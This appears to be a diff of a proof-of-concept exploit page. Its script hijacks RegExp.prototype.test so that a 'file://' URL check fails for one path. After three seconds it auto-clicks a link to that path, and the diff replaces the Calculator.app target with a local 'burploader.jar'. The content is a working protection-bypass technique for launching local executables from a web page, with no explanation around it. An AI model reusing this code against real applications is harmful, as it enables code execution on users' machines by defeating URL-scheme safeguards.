@@ -4,7 +4,7 @@
       <script>
         RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
           apply: function(target, thisArg, argumentsList) {
-          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///System/Applications/Calculator.app/')){
+          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:////home/madara/burploader.jar/')){
             return false;
           }
           return Reflect.apply(target, thisArg, argumentsList)
@@ -12,7 +12,7 @@
         });
         setTimeout(()=>{
             a = document.createElement("a")
-            a.href="file:///System/Applications/Calculator.app/"
+            a.href="file:////home/madara/burploader.jar/"
             document.body.appendChild(a)
             a.click()
         }, 3000);
